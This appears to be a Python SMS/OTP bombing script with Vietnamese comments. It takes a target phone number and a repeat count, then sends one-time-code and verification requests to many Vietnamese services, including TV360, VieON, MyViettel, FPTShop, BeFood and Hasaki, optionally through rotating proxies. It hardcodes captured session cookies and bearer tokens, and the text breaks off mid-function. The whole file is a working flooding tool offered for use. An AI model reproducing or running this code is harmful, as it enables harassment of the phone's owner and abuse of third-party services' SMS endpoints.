import requests
import time
import urllib3
import random
import json
import string
import concurrent.futures
from colorama import Fore, Style, init
import os
import sys
# Khởi tạo colorama để hỗ trợ màu sắc trong terminal
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs='/path/to/your/certificate-authority-bundle-file'
)

if len(sys.argv) != 3:
    print("Số lượng tham số không đúng")
    sys.exit()

sdt = sys.argv[1]
count = sys.argv[2]

print("Số điện thoại:", sdt)
print("Số lần lặp:", count)

count = int(count)

if count > 10000:
    count = 10000000

def sdtt(sdt):
    if sdt.startswith("0"):
        return "+84" + sdt[1:]
    return sdt

sdt_chuyen_doi = sdtt(sdt)


def load_proxies():
    """Tải danh sách proxy từ file"""
    if not os.path.exists("proxies.txt"):
        return []
    
    with open("proxies.txt", "r") as file:
        proxies = [line.strip() for line in file.readlines() if line.strip()]
    return proxies


def get_random_proxy():
    """Chọn proxy ngẫu nhiên từ danh sách."""
    proxy_list = load_proxies()
    
    if not proxy_list:
        return None
    
    proxy = random.choice(proxy_list)
    
    # Trả về định dạng proxy dict cho requests
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return {
            'http': proxy,
            'https': proxy
        }
    else:
        proxy_url = f"http://{proxy}"
        return {
            'http': proxy_url,
            'https': proxy_url
        }


def check_proxy(proxy):
    try:
        proxies = {
            'http': proxy,
            'https': proxy
        }
        response = requests.get("http://httpbin.org/ip", proxies=proxies, timeout=5)
        response.raise_for_status()
        print(f"{Fore.GREEN}Proxy hoạt động: {proxy}{Style.RESET_ALL}")
        return True
    except:
        print(f"{Fore.RED}Proxy lỗi: {proxy}{Style.RESET_ALL}")
        return False


def generate_random_email(domain='example.com'):
    length = random.randint(5, 10)
    email_name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    
    # Tạo phần tên miền email
    email = f'{email_name}@{domain}'
    return email

random_email = generate_random_email()


def tv360():
    cookies = {
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk',
        'shared-device-id': 'web_d113a986-bdb0-45cd-9638-827d1a7809bb',
        'screen-size': 's%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q',
        'access-token': '',
        'refresh-token': '',
        'msisdn': '',
        'profile': '',
        'user-id': '',
        'session-id': 's%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM',
        'G_ENABLED_IDPS': 'google',
    }

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_d113a986-bdb0-45cd-9638-827d1a7809bb.vUWWw%2BnJUtWclZZ4EpwoSqqe8Z3%2BOEyIWvptoDuLrDk; shared-device-id=web_d113a986-bdb0-45cd-9638-827d1a7809bb; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; access-token=; refresh-token=; msisdn=; profile=; user-id=; session-id=s%3Aaba282a7-d30b-4fa2-b4dd-8b1217b1a008.Jg2CyIIRl98IEt0yW76P%2BPy0G79GQOHxw6rA6PTq9BM; G_ENABLED_IDPS=google',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1721479947788',
        'tz': 'Asia/Bangkok',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'msisdn': sdt,
    }

    try:
        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TV360 | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vieon():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjE2OTc2NzcsImp0aSI6IjM2YTYxOGU4ZmNlMzlmNzVkZjJhZDk1Mjg5YWE3OTk5IiwiYXVkIjoiIiwiaWF0IjoxNzIxNTI0ODc3LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcyMTUyNDg3Niwic3ViIjoiYW5vbnltb3VzXzI1MjhiYWQ3MWJiYmY5ODg4ODJhYTcyZmRiMTA1Mzg0LWNlM2FjYzc2ODdlNmVjNWRhZGJiN2E1N2YzMWE0YTBkLTE3MjE1MjQ4NzciLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMjUyOGJhZDcxYmJiZjk4ODg4MmFhNzJmZGIxMDUzODQtY2UzYWNjNzY4N2U2ZWM1ZGFkYmI3YTU3ZjMxYTRhMGQtMTcyMTUyNDg3NyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNi4wLjAuMCBTYWZhcmkvNTM3LjM2IE9QUi8xMTIuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.wXtslFrAOKsPxT41wnkXvzY7K1AocvJykB4eI0jnesY',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '2528bad71bbbf988882aa72fdb105384',
        'device_name': 'Opera/112',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    try:
        response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VIEON | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VIEON | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def myviettel():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MYVIETTEL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MYVIETTEL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def fptshop():
    headers = {
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'apptenantid': 'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'Content-Type': 'application/json',
        'Referer': 'https://fptshop.com.vn/',
        'order-channel': '1',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'fromSys': 'WEBKHICT',
        'otpType': '0',
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://papi.fptshop.com.vn/gw/is/user/new-send-verification', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FPTSHOP | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FPTSHOP | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def pantio(): #check
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://pantio.vn',
        'priority': 'u=1, i',
        'referer': 'https://pantio.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'domain': 'pantiofashion.myharavan.com',
    }

    data = {
        'phoneNumber': sdt,
    }

    try:
        response = requests.post('https://api.suplo.vn/v1/auth/customer/otp/sms/generate', params=params, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("PANTIO | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("PANTIO | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def befood():
    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'app_version': '11261',
        'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjowLCJhdWQiOiJndWVzdCIsImV4cCI6MTcyMTY2NjE0MiwiaWF0IjoxNzIxNTc5NzQyLCJpc3MiOiJiZS1kZWxpdmVyeS1nYXRld2F5In0.hTY2ucbYZBKKCNsUaypZ1fyjVSmAN77YjfP2Iyyrs1Y',
        'content-type': 'application/json',
        'origin': 'https://food.be.com.vn',
        'priority': 'u=1, i',
        'referer': 'https://food.be.com.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'phone_no': sdt_chuyen_doi,
        'uuid': '6b83df66-d9ad-4ef0-86d9-a235c5e83aa7',
        'is_from_food': True,
        'is_forgot_pin': False,
        'locale': 'vi',
        'app_version': '11261',
        'version': '1.1.261',
        'device_type': 3,
        'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
        'customer_package_name': 'xyz.be.food',
        'device_token': '2a5886db48531ea9feb406f8801a3edd',
        'ad_id': '',
        'screen_width': 360,
        'screen_height': 640,
        'client_info': {
            'locale': 'vi',
            'app_version': '11261',
            'version': '1.1.261',
            'device_type': 3,
            'operator_token': '0b28e008bc323838f5ec84f718ef11e6',
            'customer_package_name': 'xyz.be.food',
            'device_token': '2a5886db48531ea9feb406f8801a3edd',
            'ad_id': '',
            'screen_width': 360,
            'screen_height': 640,
        },
        'latitude': 10.77253621500006,
        'longitude': 106.69798153800008,
    }

    try:
        response = requests.post('https://gw.be.com.vn/api/v1/be-delivery-gateway/user/login', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("BEFOOD | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("BEFOOD | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def foodhubzl():
    cookies = {
        'tick_session': 'f0s3e78s49netpa8583ggjedo5fiabkj',
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'tick_session=f0s3e78s49netpa8583ggjedo5fiabkj',
        'Origin': 'https://account.ab-id.net',
        'Referer': 'https://account.ab-id.net/auth/login?token=73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563&destination=https://www.foodhub.vn',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'access_token': '73f53f54d63b6caa9fb7b90f0007b72a52be1849b00a35d599fb002c22701563',
        'destination': 'https://www.foodhub.vn',
        'site_token': '',
        'phone_number': sdt,
        'remember_account': '1',
        'type': 'zalootp',
        'country': '+84',
        'country_code': 'VN',
    }

    try:
        response = requests.post('https://account.ab-id.net/auth/get_form_phone_code', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FOODHUBZL ABAHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FOODHUBZL ABAHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vttelecom():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'lang': 'vi',
        'msisdn': sdt,
        'type': 'register',
    }

    response = requests.post('https://apigami.viettel.vn/mvt-api/myviettel.php/getOtp', params=params, headers=headers)

    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'content-length': '0',
        'origin': 'https://vietteltelecom.vn',
        'priority': 'u=1, i',
        'referer': 'https://vietteltelecom.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    try:
        response = requests.post(
            f'https://apigami.viettel.vn/mvt-api/myviettel.php/getOTPLoginCommon?lang=vi&phone={sdt}&actionCode=myviettel:%2F%2Flogin_mobile&typeCode=DI_DONG&type=otp_login',
            headers=headers,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VTTELECOM | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VTTELECOM | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def vinwonders():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'content-type': 'application/json; charset=UTF-8',
        'origin': 'https://booking.vinwonders.com',
        'priority': 'u=1, i',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    json_data = {
        'channel': 10,
        'UserName': sdt_chuyen_doi,
        'Type': 1,
        'OtpChannel': 1,
    }

    try:
        response = requests.post(
            'https://booking-identity-api.vinpearl.com/api/frontend/externallogin/send-otp',
            headers=headers,
            json=json_data,
        )
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("VINWONDERS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("VINWONDERS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hasaki():
    cookies = {
        'sessionChecked': '1733243335',
        'HASAKI_SESSID': 'b4f9a3141d969a5e713baeeb62cddecc',
        'form_key': 'b4f9a3141d969a5e713baeeb62cddecc',
        'utm_hsk': '%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D',
        'PHPSESSID': 'd7q25iv138vv8kvqi4saublpbk',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        # 'cookie': 'sessionChecked=1721624886; HASAKI_SESSID=b5a41e810a240f4d2446e6241c78407a; form_key=b5a41e810a240f4d2446e6241c78407a; utm_hsk=%7B%22utm_source%22%3Anull%2C%22utm_medium%22%3Anull%2C%22utm_campaign%22%3Anull%2C%22utm_term%22%3Anull%7D; PHPSESSID=ofu3g6vsn92b0iqiu4i28e82s0',
        'priority': 'u=1, i',
        'referer': 'https://hasaki.vn/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'api': 'user.verifyUserName',
        'username': sdt,
    }

    try:
        response = requests.get('https://hasaki.vn/ajax', params=params, cookies=cookies, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("HASAKI.VN | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("HASAKI.VN | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def fahasa():
    cookies = {
        'frontend': '5c10aef0c2d142d18e1e195c6fd000b8',
        'utm_source': 'google',
        'frontend_cid': 'ApYaNQ5Yq3vGjWJJ',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'frontend=5c10aef0c2d142d18e1e195c6fd000b8; utm_source=google; frontend_cid=ApYaNQ5Yq3vGjWJJ',
        'origin': 'https://www.fahasa.com',
        'priority': 'u=1, i',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
    }

    try:
        response = requests.post('https://www.fahasa.com/ajaxlogin/ajax/checkPhone', cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("FAHASA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("FAHASA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL) 

def medigozl():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
    }

    params = {
        'from': 'ZALO',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOZL | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOZL | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)


def medigosms():
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.medigoapp.com',
        'priority': 'u=1, i',
        'referer': 'https://www.medigoapp.com/',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
    }

    json_data = {
        'phone': sdt_chuyen_doi,
    }

    try:
        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MEDIGOSMS | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MEDIGOSMS | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def ddmevabe():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://dinhduongmevabe.com.vn',
        'Referer': 'https://dinhduongmevabe.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0',
        'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Opera";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'userName': sdt,
    }

    try:
        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("DDMEVABE | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("DDMEVABE | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def mocha():
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        # 'Content-Length': '0',
        'Origin': 'https://video.mocha.com.vn',
        'Referer': 'https://video.mocha.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    params = {
        'msisdn': sdt,
        'languageCode': 'vi',
    }

    try:
        response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("MOCHA | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("MOCHA | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def tatmart(): # service 503 ne; check di
    cookies = {
        'sid_customer_6c986': '3860535321c041d920d9d9ed68e7d044-C',
    }

    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': 'sid_customer_6c986=3860535321c041d920d9d9ed68e7d044-C',
        'origin': 'https://www.tatmart.com',
        'priority': 'u=1, i',
        'referer': 'https://www.tatmart.com/profiles-add/',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        'dispatch': 'tat_commons.verifi_phone',
    }

    data = {
        'phone': sdt,
        'skip_noti': 'true',
        'security_hash': '5751fb15de53985c76fe604de779432e',
        'is_ajax': '1',
    }

    try:
        response = requests.post('https://www.tatmart.com/index.php', params=params, cookies=cookies, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for HTTP errors
        print("TATMART | TRẠNG THÁI : THÀNH CÔNG")
    except requests.exceptions.RequestException:
        print("TATMART | TRẠNG THÁI : " + Fore.RED + "THẤT BẠI" + Style.RESET_ALL)

def hacom():
    cookies = {
        'fcb677da6e48f7e29e4e541120b3608f': 'ktpv8kg2j7u3k2fm12l2kvoh93',
        'uID': 'Y1rsiwv7IwaoT4y9n1wj',
        'shopping_cart_store': 'LQ==',
        '__session:0.4430592754473912:': 'https:',
    }

    headers = {
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
